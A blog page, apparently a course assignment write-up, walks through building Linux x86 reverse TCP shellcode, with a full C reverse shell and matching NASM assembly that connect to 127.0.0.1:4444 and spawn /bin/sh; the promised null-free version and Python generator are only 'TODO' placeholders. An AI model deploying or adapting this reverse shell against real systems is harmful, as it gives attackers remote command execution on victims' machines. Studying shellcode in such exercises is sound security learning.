---
title:  Assignment 2
description: Create a Shell_Reverse_TCP shellcode
order: 2
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

As we did with the bind shell, let's start with a c model:
```c
/* reverse_tcp_model.c
 *  - connect to a host, provide shell.
 */

#include <sys/socket.h>	// socket, AF_INET, SOCK_STREAM
#include <unistd.h>	// dup2
#include <netinet/in.h>	// sockaddr, htons, INADDR_ANY
#include <arpa/inet.h>	// inet_addr

int main() {
	int port = 4444;
	const char *host = "127.0.0.1";
	int sockfd;
	struct sockaddr_in sockaddr;

	// Build socket

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// Connect socket to host

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = inet_addr(host);
	connect(sockfd, (struct sockaddr *) &sockaddr, sizeof(sockaddr));

	// Route i/o through connection

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	// Execute /bin/sh

	execve("/bin/sh", 0, 0);

	return 0;
}
```

The reverse shell seems to be slightly smaller than the bind shell, as we seem to only have 4 syscalls to handle:
- socket
- connect
- dup2
- execve

The syscalls are nearly identical to those used in the bind shell, with only using **connect** with remote *host* and *port* instead of **bind** with local *host* and *port*.  Here is the same functionality in assembly:

```nasm
; reverse_shell.nasm
;  - Connect to a host, provide shell.

global _start

section .text
_start:
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x1 (socket)
        ; ecx = esp
        ; esp => |0x00000002|0x00000001|0x00000000|
        ;          AF_INET  SOCK_STREAM    null

	push 0x0		; IPPROTO_IP
	push 0x1		; SOCK_STREAM
	push 0x2		; AF_INET
	mov eax, 0x66		; socketcall, 102
	mov ebx, 0x1		; socket, 1
	mov ecx, esp		; args
	int 0x80		; execute
	mov esi, eax		; save sockfd


	; int socketcall(int call, unsigned long *args)
        ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        ; struct sockaddr_in {short int sin_family, unsigned short int sin_port, struct in_addr sin_addr, 0}
        ; eax = 0x66 (socketcall)
        ; ebx = 0x3 (connect)
        ; ecx = esp
        ; esp => |----------|----------|0x00000018|0x0002|0x115C|0x7f000001|
        ;           sockfd      addr      addrlen  AF_INET  port   ipaddr

	push 0x0100007f		; ipaddr, 127.0.0.1
	push word 0x5c11	; port, 4444
	push word 0x2		; AF_INET
	mov ecx, esp
	push 0x10		; addrlen, 16
	push ecx		; addr
	push esi		; sockfd
	mov eax, 0x66		; socketcall, 102
	mov ebx, 0x3		; connect, 3	
	mov ecx, esp		; args
	int 0x80		; execute


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 0x0

	mov eax, 0x3f		; dup2, 63
	mov ebx, esi		; connfd
	mov ecx, 0x0		; stdin
	int 0x80


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 0x1

	mov eax, 0x3f		; dup2, 63
	mov ebx, esi		; connfd
	mov ecx, 0x1		; stdout
	int 0x80


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 2

	mov eax, 0x3f		; dup2, 63
	mov ebx, esi		; connfd
	mov ecx, 0x2		; stderr
	int 0x80


        ; int execve(const char *filename, char *const argv[], char *const envp[])
        ; eax = 0xb
        ; ebx = [esp +8]
        ; ecx = esp
        ; edx = [esp +4]
        ; esp => |--[esp +8]--|0x00000000|0x2f62696e|0x2f2f7368|0x00000000|
        ;                                    /bin       //sh

	push 0x0
        push 0x68732f2f
        push 0x6e69622f
	mov ebx, esp
	push 0x0
	mov edx, esp
	push ebx
	mov ecx, esp
	mov eax, 0xb
	int 0x80
```

Again, one might notice that there are a lot of nulls in this shellcode.  We can take steps to mitigate this by replacing various null-producing commands.  Once complete, the shellcode might look something like this:

```nasm
TODO
```

The last step is to make this shellcode portable, that is to say we need a way to swap out the parameters *host* and *port*.  I've written this *generator* in python, shown below:

```python
TODO
```

And there you have it - a reverse tcp shellcode and its very own generator.

<br>
{% include preamble.md %}


[&lt;&lt; Go Back]({{ site.baseurl }})
